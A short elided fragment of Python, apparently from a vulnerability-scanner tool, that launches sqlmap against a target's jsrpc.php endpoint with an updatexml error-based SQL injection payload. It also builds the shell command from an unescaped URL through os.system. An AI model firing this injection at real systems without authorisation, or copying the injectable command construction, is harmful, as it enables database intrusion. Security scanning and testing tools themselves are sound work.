            ...
            if not self.batch:
                ...
                if choose == "y":
                    ...
                    try:
                        ...
                        os.system(f"cd cve/VulsScan/sqlmap/ && python sqlmap.py -u \"{url}/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0xa,*),0)\" --output-dir={dir}/result/ --batch")
                    except Exception as e:
                        OutPrintInfoErr(e)
        if not self.batch:
